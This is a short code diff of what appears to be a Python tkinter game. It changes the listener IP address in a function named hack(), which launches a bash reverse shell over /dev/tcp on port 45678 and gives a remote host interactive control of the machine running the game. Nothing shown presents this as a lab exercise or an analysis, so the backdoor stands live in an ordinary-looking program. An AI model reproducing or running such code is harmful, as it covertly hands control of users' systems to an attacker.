@@ -28,7 +28,7 @@ def update_result(text):
     result.configure(text=text)
  
 def hack(num):
-       subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.115/45678 0<&1 2>&1", shell=True, executable='/bin/bash')
+       subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.120/45678 0<&1 2>&1", shell=True, executable='/bin/bash')
 
 # Create a new game
 def new_game():
